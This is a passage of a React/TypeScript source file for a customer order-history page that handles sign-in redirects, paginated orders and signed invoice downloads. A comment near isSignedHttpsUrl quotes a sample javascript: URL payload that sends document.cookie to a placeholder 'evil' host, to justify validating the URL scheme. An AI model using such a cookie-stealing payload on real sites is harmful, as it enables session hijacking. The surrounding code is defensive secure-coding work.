import React, { useEffect, useRef, useState } from 'react';

import PageMeta from '../PageMeta';
import Breadcrumbs from '../Breadcrumbs';
import RotatingHero from '../RotatingHero';
import PillButton from '../PillButton';
// The MODULE is the mockable seam, and the boolean is read as a property access INSIDE the
// render body - never captured in a module-scope const. An ESM const cannot be spied and
// vi.stubEnv runs strictly after module evaluation, which is exactly why API_BASE below is not
// overridable today. There is deliberately no local alias either: two names for one fact.
import { featureFlags } from '../../config/featureFlags';
import { clearSession, getSession, restoreSession } from '../../lib/customerAuth';
import { actionFromSearch, stashCustomerMenuAction, takeCustomerMenuAction, sendCustomerMenuAction } from '../../lib/customerMenuActions';
import { formatPaiseINR } from '../../lib/money';
import { PAYMENT_STATUS_LABEL, PAYMENT_STATUS_NOTE } from '../../lib/orderStatusLabels';
import {
  isPublicOrderNumber, orderNumberFromUrl, stashPendingOrder, takePendingOrder,
} from '../../lib/orderPage';
import { isCarriableReference, reviewWaLink } from '../../lib/reviewLink';
import OrderActionIcon from './OrderActionIcon';
import OrderActionsMenu from './OrderActionsMenu';
import OrderDetail from './OrderDetail';

/**
 * /orders — what a customer has bought from us, and what each payment is doing.
 *
 * RENAMED FROM [retired public path] ON OWNER INSTRUCTION, label and URL together. UNVERIFIED IN
 * THIS PASS, and carried forward as a claim rather than restated as fact: the old path is
 * must be verified against the current Amplify custom rules before any URL retirement;
 * and the same change repointed a FROZEN_EXTERNAL entry printed inside a DLT-approved SMS
 * template that cannot be edited. The route this page serves is unchanged by this rebuild, so
 * nothing here can break that redirect - but nobody re-measured it against the live Amplify app
 * while writing this, so do not treat the 301 as measured.
 *
 * FOUR REGISTRY LISTS HAVE TO AGREE OR THE SUITE FAILS. '/orders' must be in the EXACT-MATCH
 * allowlist in _app.tsx (:523) or this renders an empty body with HTTP 200 - a 404 that does not
 * look like one; in PUBLIC_EXACT in scripts/generate-sitemap.js (:44); and as both path and name
 * in config/public-pages.json (:107), whose description must stay BYTE-IDENTICAL to the one in
 * _app.tsx. trailingSlash means the URL is /orders/. All four are already in step and this
 * rebuild changes none of them.
 *
 * THE PAGE IS PUBLIC AND INDEXED, WHICH IS A CONSTRAINT ON THE FIRST RENDER. /orders is in
 * PUBLIC_PAGE_META, the sitemap allowlist and public-pages.json, and generate-sitemap.js refuses
 * a URL that is both allowlisted and blocked - so there is no noindex here, and the static export
 * is a real public page. Personal order data remains client-only and is never emitted into the
 * static artifact. Authentication is not rendered here: on hydration, a missing customer session
 * redirects immediately to /auth?return=/orders/. /auth owns the complete phone/OTP flow.
 *
 * WHAT THIS PAGE DOES NOT CLAIM. It lists paid website orders, read from one bounded query over
 * the caller's own partition. It is not a tracker for a request or a booking, and the empty state
 * says so rather than asserting that nothing was bought - a captured payment can leave no order
 * row at all (finalization stages PURCHASED_SNAPSHOT_MISSING and returns before the order write),
 * and no later writer creates one. Phase 3 cannot repair that; the repair is on the money path.
 *
 * ONE ORDERS PAGE. Every purchase channel goes to /orders/, not a separate detail
 * screen. Expanding a history row fetches its own authorized item, delivery and invoice data.
 * Historical ?o= links are reduced to /orders/ and their row opens after OTP sign-in.
 * A public Order Number is a selector only; authenticated APIs verify ownership.
 */

const API_BASE = process.env.NEXT_PUBLIC_API_BASE || 'https://wecare.digital/api';
const MY_ORDERS_URL = `${ API_BASE }/ecommerce/my-orders`;
const MY_INVOICE_URL = `${ API_BASE }/ecommerce/my-invoice`;
const PROFILE_URL = `${ API_BASE }/customer/profile`;

/**
 * How long after an empty FIRST page we ask once more. The arrival path that needs it is real:
 * cart.tsx's terminal rail links straight here after a payment, and the index is eventually
 * consistent, so a just-created order can be briefly absent. One extra read per visit, no poll.
 */
const RECHECK_DELAY_MS = 4000;

/** One page is 20 server-side; the request sends no `limit` and takes that default. */
interface OrderRow {
  orderNumber: string;
  referenceId: string;
  /** INT epoch SECONDS, UTC. Formatted in the browser so an IST reader sees their own day. */
  createdAt: number | null;
  amountPaise: number | null;
  currency: string;
  currencyUnexpected: boolean;
  /** payment_status canonical. '' when unmappable. Never a raw provider spelling. */
  status: string;
  /** On the wire for a future filter. Deliberately not read here. */
  statusRank: number;
  /**
   * `'website' | 'whatsapp'`, canonicalised server-side by `lambda_utils.ecommerce.order_channel`
   * so the browser never sees a third spelling. Typed `string` rather than a union because the
   * value arrives from the network: a union would be a claim about untrusted input, and the one
   * read below already treats anything that is not `'whatsapp'` as the website.
   */
  channel: string;
  /** Stable compact customer-facing support label (C-…), derived server-side. */
  customerDisplayId: string;
}

interface OrdersResponse {
  orders?: OrderRow[];
  cursor?: string;
}

/**
 * The customer stays on one Orders history screen. An owned order expands inside its
 * existing row; incoming historical query links are sanitized back to /orders/.
 * There is no focus/detail page URL and no separate sign-in surface here.
 */
type View = 'loading' | 'ready' | 'empty' | 'error';
type Failure = 'rate' | 'unavailable';

type AlertSource = 'orders' | 'link' | 'pagination' | 'invoice' | 'detail' | 'service';
interface OrdersAlert { source: AlertSource; message: string; key?: string; }
interface CopyNotice { kind: 'success' | 'fallback'; message: string; }

type Outcome =
  | { kind: 'ok'; data: OrdersResponse }
  | { kind: 'expired' }
  | { kind: 'rate' }
  | { kind: 'unavailable' };

type LinkOutcome = 'ok' | 'expired' | 'ignored';

/**
 * The §3.6 map, keyed on the CANONICAL word and nothing else, now shared with the order page
 * from `lib/orderStatusLabels` so the two screens cannot word one payment state two ways. The
 * mapping from 'PAYMENT_PAID', 'paid' and 'completed' happened once, on the server, in
 * payment_status. Re-introducing any of those spellings here would be the frontend starting a
 * sixth vocabulary.
 */
const STATUS_LABEL = PAYMENT_STATUS_LABEL;
const STATUS_NOTE = PAYMENT_STATUS_NOTE;

/** The two states that read as firm rather than advisory. A weight step, never a hue. */
const STATUS_FIRM = new Set( [ 'captured', 'refunded' ] );

/**
 * An ALIAS, never a second Set. The states that are financially settled are exactly the states
 * an invoice can exist for, so this is the same fact twice and not a coincidence worth
 * duplicating - two identical payment-vocabulary sets with nothing forcing them to agree is how
 * a vocabulary starts drifting. If they ever legitimately diverge (a rank that is firm but not
 * invoiceable), split them THEN and add a test naming the difference.
 */
const INVOICE_ELIGIBLE = STATUS_FIRM;

function dateLabel ( createdAt: number | null ): string {
  if ( createdAt === null || !Number.isFinite( createdAt ) ) return '';
  return new Date( createdAt * 1000 )
    .toLocaleDateString( 'en-IN', { day: 'numeric', month: 'short', year: 'numeric' } );
}

/**
 * The column shows a short date; the detail panel is where the time belongs. Same refusal as
 * `dateLabel`: an unreadable `createdAt` renders nothing rather than "Invalid Date".
 */
function dateTimeLabel ( createdAt: number | null ): string {
  if ( createdAt === null || !Number.isFinite( createdAt ) ) return '';
  return new Date( createdAt * 1000 ).toLocaleString( 'en-IN', {
    day: 'numeric', month: 'short', year: 'numeric', hour: 'numeric', minute: '2-digit',
  } );
}

/**
 * The key for the VIEW state - expansion and the copy hint. A pure module-scope function, which
 * the styled-jsx rule permits (only JSX may not be hoisted out of the return tree).
 *
 * It is NEVER empty, which is the whole reason it is separate from the invoice map's key: a row
 * with no `orderNumber` and no `referenceId` still has a date, an amount and a status worth
 * reading, so it must still be expandable. Behaviourally identical to the old React key
 * (`referenceId || orderNumber || index`) - only the final fallback differs, and both are unique
 * among siblings, which is all a key must be.
 */
const rowKey = ( order: OrderRow, index: number ) =>
  order.referenceId || order.orderNumber || `row-${ index }`;

/** Per-row invoice state. Transient; the column carries it, the panel never echoes it. */
type InvoiceState = 'idle' | 'busy' | 'none' | 'failed' | 'rate';

/**
 * `fetchInvoiceUrl`'s return type, and `kind` is NOT the same vocabulary as `InvoiceState`:
 * 'ok' is an outcome with no resting state (the row returns to 'idle' once the download fires)
 * and 'expired' never becomes a cell at all, because it unmounts the table. Keeping the two
 * separate is what stops a later edit rendering a cell for an outcome that has no cell.
 */
type InvoiceOutcome =
  | { kind: 'ok'; url: string }
  | { kind: 'none' }        // available:false, 400, 403, 404, or a 200 that is not JSON - terminal
  | { kind: 'rate' }        // 429
  | { kind: 'failed' }      // !response.ok, a network rejection, or an unsigned url
  | { kind: 'expired' };    // 401 - the caller runs expire(); it never reaches a cell

/**
 * Mirrors `receipt_links.is_permanent_public_url`'s own marker set
 * (lambda_utils/receipt_links.py), so the two sides cannot drift when the signer changes.
 */
const SIGNED_MARKERS = [ 'X-Amz-Signature=', 'X-Amz-Credential=', 'Signature=', 'Expires=' ];

/**
 * A TYPE PREDICATE (`url is string`), not a boolean, and the signature is load-bearing: the
 * caller assigns the guarded value straight into InvoiceOutcome's `ok` arm, which is
 * `{ kind: 'ok'; url: string }`. A boolean-returning guard narrows nothing, so `body.url` would
 * still be `unknown` at the return and `tsc --noEmit` under strict would fail TS2322.
 *
 * WHY THE SCHEME IS TESTED AND NOT JUST THE SIGNATURE. The value is assigned to `a.href` and
 * then clicked, so it is an execution surface rather than just a link. A marker-only predicate
 * accepts `javascript:void(fetch('https://evil/?c='+document.cookie))` with an `Expires=`
 * comment stapled on, and clicking an anchor with a javascript: href runs it in this origin,
 * where the customer's session lives. The server's `assert_not_permanent` is no help here:
 * `is_permanent_public_url` returns False for anything not starting with 'http', so it passes a
 * non-http string THROUGH as "not permanent". `http://` is excluded too - a signed URL over
 * plaintext hands the grant to any observer, and S3 presigned URLs are https in this account.
 */
function isSignedHttpsUrl ( url: unknown ): url is string {
  return typeof url === 'string'
    && url.startsWith( 'https://' )
    && SIGNED_MARKERS.some( marker => url.includes( marker ) );
}

/**
 * This function's BODY IS the error table, which is why it is written out rather than delegating
 * to a guard somewhere else: the terminal-status set is spelled exactly once, here.
 *
 * 400, 403 and 404 are terminal rather than retryable, and none of the three is clearable by
 * clicking: a 400 is a defect in the body we just built and a retry re-sends it byte-identical,
 * a 403 is a missing or mis-qualified grant, and a 404 means the route is not where we think it
 * is. A 200 whose body is not JSON says the same thing. An affordance that invites a loop it can
 * never win is worse than a flat statement.
 *
 * Nothing on this path logs. The URL is a bearer grant.
 */
async function fetchInvoiceUrl (
  token: string, referenceId: string, createdAt: number,
): Promise<InvoiceOutcome> {
  let response: Response;
  try
  {
    response = await fetch( MY_INVOICE_URL, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: `Bearer ${ token }` },
      body: JSON.stringify( { referenceId, createdAt, format: 'png' } ),
    } );
  }
  catch
  {
    return { kind: 'failed' };          // network rejection - recoverable, offers Try again
  }

  if ( response.status === 401 ) return { kind: 'expired' };
  if ( response.status === 429 ) return { kind: 'rate' };
  if ( response.status === 400 || response.status === 403 || response.status === 404 )
  {
    return { kind: 'none' };
  }
  if ( !response.ok ) return { kind: 'failed' };   // 5xx and anything else - recoverable

  let data: unknown;
  try { data = await response.json(); }
  catch { return { kind: 'none' }; }

  const body = ( data ?? {} ) as { available?: unknown; url?: unknown };
  if ( body.available !== true ) return { kind: 'none' };
  if ( !isSignedHttpsUrl( body.url ) ) return { kind: 'failed' };
  return { kind: 'ok', url: body.url };
}

/**
 * Only ever called with an outcome of kind 'ok', i.e. a url that already passed
 * `isSignedHttpsUrl` inside `fetchInvoiceUrl` - so the guard runs BEFORE createElement and the
 * element never exists carrying an unvalidated href.
 *
 * THERE IS NO `download` ATTRIBUTE, and that is a decision. `receipt_links.signed_url` bakes
 * `attachment; filename="..."` INTO the signature, so S3 already returns the header that makes
 * the browser download rather than navigate, under the server's own sanitised name. The
 * attribute would be a second, unverified source of truth for the same fact - and `download` is
 * same-origin-only, so a cross-origin response (which a presigned S3 URL is) makes the browser
 * ignore it and honour Content-Disposition anyway. The downloaded file's name is owned entirely
 * by the Lambda, which is also where the sanitisation lives.
 *
 * A synthetic anchor rather than `location.assign`: deterministic, keeps the page mounted, and
 * directly assertable by spying on HTMLAnchorElement.prototype.click. Rejected: rendering a real
 * <a href> after a successful fetch - two taps for a one-tap action, and it would leave a live
 * bearer grant sitting in the DOM.
 */
function triggerDownload ( url: string ) {
  const anchor = document.createElement( 'a' );
  anchor.href = url;
  anchor.rel = 'noopener';
  document.body.appendChild( anchor );
  anchor.click();
  anchor.remove();
}

/**
 * The refused-clipboard recovery, and IT CANNOT THROW - it runs inside `copyId`'s catch arm, so
 * an exception here would break the only recovery that path has. jsdom implements
 * createRange/getSelection only partially and a real browser can return null from
 * getSelection() in a detached context, so every step is optional-chained inside one try. The
 * worst case is that the text is not selected, which still leaves the hint and the announcement.
 */
function selectText ( el: HTMLElement | null ) {
  if ( !el ) return;
  try
  {
    const range = document.createRange();
    range.selectNodeContents( el );
    const selection = window.getSelection?.();
    if ( !selection ) return;
    selection.removeAllRanges();
    selection.addRange( range );
  }
  catch
  {
    /* Selection is unavailable. The hint and the live region still carry the recovery. */
  }
}

async function ensureCustomerLink ( token: string ): Promise<LinkOutcome> {
  try
  {
    const response = await fetch( PROFILE_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
        Authorization: `Bearer ${ token }`,
      },
      // Empty body is the existing authenticated profile bootstrap. It claims an
      // evidence-backed WhatsApp-first contact and promotes NEEDS_CUSTOMER_LINK orders.
      body: JSON.stringify( {} ),
    } );
    if ( response.status === 401 ) return 'expired';
    return response.ok ? 'ok' : 'ignored';
  }
  catch
  {
    // Order history is still readable if profile linking is temporarily unavailable.
    return 'ignored';
  }
}

async function fetchOrders ( token: string, cursor: string ): Promise<Outcome> {
  try
  {
    const response = await fetch( MY_ORDERS_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
        Authorization: `Bearer ${ token }`,
      },
      // The body allowlist is {limit, cursor} and nothing else - any other key is a 400.
      body: JSON.stringify( cursor ? { cursor } : {} ),
    } );
    // A 401 is the normal end of an hour-long token, not a fault. It is handled as a return to
    // the signed-out state with the expiry line, never as the error state.
    if ( response.status === 401 ) return { kind: 'expired' };
    if ( response.status === 429 ) return { kind: 'rate' };
    if ( !response.ok ) return { kind: 'unavailable' };
    const data = ( await response.json() ) as OrdersResponse;
    return { kind: 'ok', data };
  }
  catch
  {
    return { kind: 'unavailable' };
  }
}

export default function OrdersPage (): React.ReactElement {
  const [ view, setView ] = useState<View>( 'loading' );
  const [ token, setToken ] = useState( '' );
  const [ orders, setOrders ] = useState<OrderRow[]>( [] );
  const [ cursor, setCursor ] = useState( '' );
  const [ rechecked, setRechecked ] = useState( false );
  const [ loadingMore, setLoadingMore ] = useState( false );
  /** Historical or post-checkout order to open within this table, never on another page. */
  const [ requestedOrder, setRequestedOrder ] = useState( '' );

  /** Which detail panels are open. Many at once, deliberately - see `toggleRow`. */
  const [ openRows, setOpenRows ] = useState<Record<string, boolean>>( {} );
  /** Keyed on `order.referenceId`, written by `downloadInvoice` and read in the row locals. */
  const [ invoiceState, setInvoiceState ] = useState<Record<string, InvoiceState>>( {} );
  const [ copyNotice, setCopyNotice ] = useState<CopyNotice | null>( null );
  // One persistent, accessible failure notice for every backend operation on this page.
  // It is rendered above the table rather than over it, and cleared by a successful retry.
  const [ ordersAlert, setOrdersAlert ] = useState<OrdersAlert | null>( null );
  const [ canCopy, setCanCopy ] = useState( false );

  const liveRef = useRef( true );
  useEffect( () => () => { liveRef.current = false; }, [] );

  /**
   * A clipboard write needs a secure context, and the button must not exist where it cannot
   * work. Computed in an EFFECT and never during render, so the server-rendered signedOut shell
   * and the first client paint agree.
   */
  useEffect( () => {
    setCanCopy(
      typeof navigator !== 'undefined' && !!navigator.clipboard && window.isSecureContext );
  }, [] );

  /** One timer for the top-right copy toast, not a timer or feedback label per row. */
  const copyTimer = useRef<ReturnType<typeof setTimeout> | null>( null );

  const restartTimer = ( fn: () => void, ms = 2000 ) => {
    if ( copyTimer.current ) clearTimeout( copyTimer.current );
    copyTimer.current = setTimeout( fn, ms );
  };

  // The expiry path unmounts the table while a timer may still be pending, and setState on an
  // unmounted tree is the warning this cleanup exists to avoid.
  useEffect( () => () => { if ( copyTimer.current ) clearTimeout( copyTimer.current ); }, [] );

  /**
   * The parameter is `rowId` and not `key`, and the name is the point: there are two keyers in
   * the row callback - `rowId` (never empty, keys the view state) and `invoiceKey`
   * (`order.referenceId`, may be `''`, keys the request state). `key` was the overloaded name
   * that let one identifier stand for both, and the read then used the wrong one of the pair.
   */
  const toggleRow = ( rowId: string ) =>
    setOpenRows( prev => ( { ...prev, [ rowId ]: !prev[ rowId ] } ) );

  /**
   * Only the unmodified order identifier is copied. The top-right toast confirms
   * clipboard success without exposing the identifier in an accessible announcement.
   * A denied write selects the text and leaves an actionable instruction until
   * the next attempt, rather than incorrectly claiming "Copied".
   */
  const copyId = async ( value: string, index: number ) => {
    if ( copyTimer.current ) {
      clearTimeout( copyTimer.current );
      copyTimer.current = null;
    }
    try
    {
      await navigator.clipboard.writeText( value );
      setCopyNotice( { kind: 'success', message: 'Copied' } );
      restartTimer( () => setCopyNotice( null ), 2500 );
    }
    catch
    {
      selectText( document.getElementById( `ord-id-${ index }` ) );
      setCopyNotice( { kind: 'fallback',
        message: 'Order ID selected. Copy it with your keyboard.' } );
    }
  };

  /**
   * One switch over the outcome, and the `default` arm is the exhaustiveness MECHANISM rather
   * than decoration. TypeScript checks a switch for exhaustiveness only when something forces
   * it; this function returns Promise<void> and nothing consumes the switch, so without
   * `const unhandled: never = outcome` a sixth outcome compiles clean and leaves the row stuck
   * on 'busy' forever. `void unhandled` is there so the binding is not an unused local.
   */
  const dismissAlertFor = ( source: AlertSource, key?: string ) => {
    setOrdersAlert( current => current?.source === source && ( !key || current.key === key )
      ? null : current );
  };

  const detailNotice = ( orderNumber: string, message: string | null ) => {
    if ( message ) {
      setOrdersAlert( { source: 'detail', key: orderNumber, message } );
    } else {
      dismissAlertFor( 'detail', orderNumber );
    }
  };

  const downloadInvoice = async ( order: OrderRow ) => {
    // The map's key. SAME NAME and same expression as the row callback's local, deliberately:
    // this writes the map and the render reads it, so one grep finds both sides.
    const invoiceKey = order.referenceId;
    if ( !token || !invoiceKey || !Number.isInteger( order.createdAt ) ) return;
    dismissAlertFor( 'invoice', invoiceKey );
    setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'busy' } ) );
    const outcome = await fetchInvoiceUrl( token, invoiceKey, order.createdAt as number );
    if ( !liveRef.current ) return;
    switch ( outcome.kind )
    {
      case 'expired': expire(); return;           // unmounts the table; no row state to set
      case 'ok':
        triggerDownload( outcome.url );
        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'idle' } ) );
        dismissAlertFor( 'invoice', invoiceKey );
        return;
      case 'none':
        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'none' } ) );
        setOrdersAlert( { source: 'invoice', key: invoiceKey,
          message: 'An invoice is not available for this order yet.' } );
        return;
      case 'rate':
        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'rate' } ) );
        setOrdersAlert( { source: 'invoice', key: invoiceKey,
          message: 'Too many invoice requests. Wait a moment and try again.' } );
        return;
      case 'failed':
        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'failed' } ) );
        setOrdersAlert( { source: 'invoice', key: invoiceKey,
          message: 'Invoice download failed. Please try again.' } );
        return;
      default: { const unhandled: never = outcome; void unhandled; return; }
    }
  };

  /**
   * The 4-second window is DERIVED, not stored. A boolean set from inside an effect is the
   * react-hooks/set-state-in-effect shape PageTopBand works around with a timeout; there is
   * nothing to store here, because "we are between an empty first page and its one re-ask" is
   * exactly `view === 'empty' && !rechecked`.
   */
  const checking = view === 'empty' && !rechecked && !!token;

  const expire = () => {
    clearSession();
    setToken( '' );
    setOrders( [] );
    setCursor( '' );
    window.location.replace( '/auth?return=/orders/' );
  };

  const signOut = () => {
    clearSession();
    window.location.replace( '/auth/' );
  };

  const applyFirstPage = ( data: OrdersResponse ) => {
    const rows = data.orders || [];
    setOrders( rows );
    setCursor( String( data.cursor || '' ) );
    dismissAlertFor( 'orders' );
    setView( rows.length === 0 ? 'empty' : 'ready' );
  };

  const applyFailure = ( kind: Failure ) => {
    setOrdersAlert( { source: 'orders', message: kind === 'rate'
      ? 'Too many requests. Wait a moment and try again.'
      : 'We could not load your orders just now. Try again shortly.' } );
    setView( 'error' );
  };

  // The mount effect owns the customer gate. /orders never renders a second sign-in surface:
  // a missing or unrestorable customer session goes straight to the canonical /auth route.
  useEffect( () => {
    let live = true;
    ( async () => {
      // The menu URL holds an allowlisted action, never a phone. Preserve the intent
      // in this tab through the existing /auth/ sign-in redirect.
      const fromMenu = actionFromSearch( window.location.search );
      if ( fromMenu ) stashCustomerMenuAction( fromMenu );
      // Older ?o= links open the same Orders table; no separate detail URL remains.
      const fromUrl = orderNumberFromUrl();
      const pending = takePendingOrder();
      const requested = fromUrl || pending;
      if ( new URLSearchParams( window.location.search ).has( 'o' ) || fromMenu ) {
        // One canonical URL: refresh/back cannot queue the same template again.
        window.history.replaceState( window.history.state, '', '/orders/' );
      }
      let session = getSession();
      if ( !session )
      {
        try { session = await restoreSession(); }
        catch { session = null; }
      }
      if ( !live ) return;
      if ( requested ) setRequestedOrder( requested );
      if ( !session )
      {
        if ( requested ) stashPendingOrder( requested );
        window.location.replace( '/auth?return=/orders/' );
        return;
      }
      setToken( session.accessToken );

      // A customer can already have a paid WhatsApp order before this browser session owns the
      // WhatsApp-first contact row. Re-run the evidence-checked bootstrap on every Orders visit:
      // it is idempotent, and it promotes any NEEDS_CUSTOMER_LINK order to this Cognito subject.
      const linkOutcome = await ensureCustomerLink( session.accessToken );
      if ( !live ) return;
      if ( linkOutcome === 'expired' ) { expire(); return; }
      if ( linkOutcome === 'ignored' ) {
        setOrdersAlert( { source: 'link',
          message: 'Some linked purchases could not be refreshed right now.' } );
      }

      // Consume BEFORE sending. Even if the provider times out, a reload must not
      // silently send a second template; a fresh menu click is an explicit retry.
      const serviceAction = takeCustomerMenuAction();
      if ( serviceAction ) {
        const result = await sendCustomerMenuAction( serviceAction, session.accessToken );
        if ( !live ) return;
        if ( result.kind === 'expired' ) { expire(); return; }
        const name = serviceAction === 'subscribe' ? 'Subscribe' : 'Leave Review';
        setOrdersAlert( { source: 'service', message: result.kind === 'accepted'
          ? `WhatsApp accepted your ${ name } invitation. Open your chat to continue. Delivery and form completion are tracked separately.`
          : `Could not send the ${ name } invitation. Please try again from the menu.` } );
      }

      setView( 'loading' );
      const outcome = await fetchOrders( session.accessToken, '' );
      if ( !live ) return;
      if ( outcome.kind === 'ok' ) applyFirstPage( outcome.data );
      else if ( outcome.kind === 'expired' ) expire();
      else applyFailure( outcome.kind );
    } )();
    return () => { live = false; };
  }, [] );

  // Open a post-checkout or historical deep link inside its matching history row.
  useEffect( () => {
    if ( !requestedOrder || view !== 'ready' ) return;
    const index = orders.findIndex( item => item.orderNumber === requestedOrder );
    if ( index < 0 ) return;
    const id = rowKey( orders[ index ], index );
    setOpenRows( previous => previous[ id ] ? previous : { ...previous, [ id ]: true } );
    setRequestedOrder( '' );
  }, [ requestedOrder, orders, view ] );

  /**
   * The one-shot re-ask, in its own effect WITH a clearTimeout cleanup. Without the cleanup,
   * leaving the page inside the window still fires a request against a token the page no longer
   * holds and then sets state on an unmounted tree. Keyed on `view === 'empty'`, which is a
   * FIRST-PAGE condition: an empty page returned from a cursor leaves `view` at 'ready' and so
   * cannot enter this branch, which is exactly the distinction between "I have nothing" and "I
   * reached the end of a page".
   */
  useEffect( () => {
    if ( view !== 'empty' || rechecked || !token ) return undefined;
    let live = true;
    const timer = window.setTimeout( () => {
      ( async () => {
        const outcome = await fetchOrders( token, '' );
        if ( !live ) return;
        setRechecked( true );
        if ( outcome.kind === 'ok' ) applyFirstPage( outcome.data );
        else if ( outcome.kind === 'expired' ) expire();
        else applyFailure( outcome.kind );
      } )();
    }, RECHECK_DELAY_MS );
    return () => { live = false; window.clearTimeout( timer ); };
  }, [ view, rechecked, token ] );

  const loadMore = async () => {
    if ( !token || !cursor || loadingMore ) return;
    setLoadingMore( true );
    dismissAlertFor( 'pagination' );
    const outcome = await fetchOrders( token, cursor );
    if ( !liveRef.current ) return;
    setLoadingMore( false );
    if ( outcome.kind === 'expired' ) { expire(); return; }
    if ( outcome.kind !== 'ok' )
    {
      // The rows already on screen stay, and so does the button, so a second tap retries. An
      // error view here would throw away a list the customer is reading over a pagination hiccup.
      setOrdersAlert( { source: 'pagination', message: outcome.kind === 'rate'
        ? 'Too many requests. Wait a moment before loading more orders.'
        : 'We could not load more orders. Please try again.' } );
      return;
    }
    const rows = outcome.data.orders || [];
    setOrders( prev => [ ...prev, ...rows ] );
    // An empty cursored page appends nothing and drops the button, silently: DynamoDB hands out
    // a cursor whenever a query stops at Limit, so a customer with exactly 20 orders gets one.
    // There is no "no more orders" message, because there is nothing to tell them.
    setCursor( String( outcome.data.cursor || '' ) );
  };

  const signedIn = view === 'ready' || view === 'empty';

  return (
    <>
      <PageMeta
        title="Your orders"
        description="Your orders, payment status and invoices in one place."
        path="/orders/"
      />
      { /* Orders has one canonical URL. Historical incoming order selectors are
           consumed and removed before they can become new outgoing links. */ }
      <RotatingHero
        compact
        frame="Your"
        words={ [ { word: 'orders', tint: 'var(--public-brand-lime)', dot: 'var(--public-brand-green)' } ] }
        sub="Purchases, payments and invoices."
        ariaLabel="Your orders"
      >
        { /* The band owns the h1, the <main>, both header clearances, the measure, the gutters
             and the 'Inter' stack. Nothing below re-declares any of them, and nothing
             conversion-shaped - no button, link or price - goes inside the band itself. */ }
        <div className="ord-page">
          {/* THE VISIBLE BREADCRUMB mirroring _app.tsx's BreadcrumbList for /orders/:
              Home -> 'Orders' (the exact PUBLIC_PAGE_META name). It is page furniture, not a
              conversion control, so it sits at the top of the band content without breaking the
              "nothing conversion-shaped in the band" rule. No page-level JSON-LD - _app.tsx owns
              the single BreadcrumbList for this PUBLIC_PAGE_META route. */}
          <Breadcrumbs items={ [ { label: 'Home', href: '/' }, { label: 'Orders' } ] } />

          { ( ordersAlert || copyNotice ) && (
            <div className="ord-toast-rail">
              { ordersAlert && (
                <p className="ord-backend-toast" role="alert" aria-atomic="true">
                  { ordersAlert.message }
                </p>
              ) }
              { copyNotice && (
                <p className="ord-backend-toast ord-copy-toast" role={ copyNotice.kind === 'fallback' ? 'alert' : 'status' }
                  aria-atomic="true">
                  { copyNotice.message }
                </p>
              ) }
            </div>
          ) }

          { ( view === 'ready' || view === 'empty' ) && token && requestedOrder
            && !orders.some( item => item.orderNumber === requestedOrder ) && (
            <section className="ord-requested-order" aria-label="Requested order details in your Orders list">
              <OrderDetail accessToken={ token } orderNumber={ requestedOrder }
                onExpired={ expire } onNotice={ detailNotice } />
            </section>
          ) }

          { view === 'error' && (
            <div className="ord-gate">
              <button
                type="button"
                className="ord-quiet"
                onClick={ () => {
                  if ( !token ) return;
                  dismissAlertFor( 'orders' );
                  setView( 'loading' );
                  ( async () => {
                    const outcome = await fetchOrders( token, '' );
                    if ( !liveRef.current ) return;
                    if ( outcome.kind === 'ok' ) applyFirstPage( outcome.data );
                    else if ( outcome.kind === 'expired' ) expire();
                    else applyFailure( outcome.kind );
                  } )();
                } }
              >
                Try again
              </button>
            </div>
          ) }

          { signedIn && (
            <div className="ord-shell">
              { /* Account details stay private; Subscribe remains in the actions menu. */ }

              { /* RIGHT: the order history. The list and the empty state are alternatives and
                   never render together. */ }
              <div className="ord-main">
          { orders.length > 0 && (
            <section className="ord-list" aria-labelledby="ord-history">
              <div className="ord-list-head">
                <h2 className="ord-h2" id="ord-history">Orders</h2>
                <button type="button" className="ord-account-action ord-signout"
                  aria-label="Sign out" title="Sign out" onClick={ signOut }>
                  <OrderActionIcon name="logout" />
                </button>
              </div>

              { /* ONE REAL TABLE AT EVERY WIDTH, with no display:block re-flow - that strips
                   table semantics in several screen readers, which would trade the owner's
                   "proper table" for something worse than the definition list it replaced.
                   The 280px objection is answered by this scroll container plus the shell's
                   minmax(0,1fr), which together keep documentElement.scrollWidth - vw at 0.

                   tabIndex={0} is what lets a keyboard user scroll the region (WCAG 2.1.1). It
                   adds one tab stop, which is the accepted cost. It is also the deliberate
                   exception to the hairline split: a 1px border with no hover treatment at all,
                   whose focus cue is the 3px outline. */ }
              <div
                className="ord-tablewrap"
                role="region"
                aria-labelledby="ord-history"
                tabIndex={ 0 }
              >
                <table className="ord-table">
                  <thead>
                    <tr>
                      { /* Exactly five. Not uppercase and not letter-spaced - this is the
                           page's own 12px/700/#1a3a2a label rung, which is literally the old
                           definition-list <dt> re-laid-out. */ }
                      <th scope="col" className="ord-th">Order #</th>
                      <th scope="col" className="ord-th ord-col-date">Date</th>
                      <th scope="col" className="ord-th ord-th-num">Amount</th>
                      <th scope="col" className="ord-th">Status</th>
                      <th scope="col" className="ord-th">Invoice</th>
                    </tr>
                  </thead>
                  <tbody>
                    { orders.map( ( order, index ) => {
                      // TWO KEYERS FOR TWO MAPS, named separately. `rowId` is view state and is
                      // never empty; `invoiceKey` is request state and is '' when there is
                      // nothing to ask for. One local serving both is the shape that let a read
                      // use the wrong one of the pair and stay correct only by coincidence of
                      // render ordering. No identifier on this page is named `key`.
                      const rowId = rowKey( order, index );
                      const invoiceKey = order.referenceId;
                      const date = dateLabel( order.createdAt );
                      // The ONE ladder for the visible text, the row header's accessible name
                      // and the copy button's label, so those three cannot disagree.
                      const displayId =
                        order.orderNumber || order.referenceId || date || '';
                      // Deliberately NOT the same ladder: it stops at the two real identifiers
                      // and never falls through to the date, because copying a date into a
                      // support ticket is worse than no control at all.
                      const copyValue = order.orderNumber || order.referenceId || '';
                      const isOpen = !!openRows[ rowId ];
                      // Derived from the render position, not the referenceId, so a row with no
                      // identifier still gets a unique valid id and aria-controls is never empty.
                      const detailId = `ord-detail-${ index }`;
                      // '' short-circuits rather than falling back to rowId: a row with no
                      // reference has no request this could ever key.
                      const state = ( invoiceKey && invoiceState[ invoiceKey ] ) || 'idle';
                      const amount = order.currencyUnexpected
                        ? ''
                        : formatPaiseINR( order.amountPaise, order.currency );
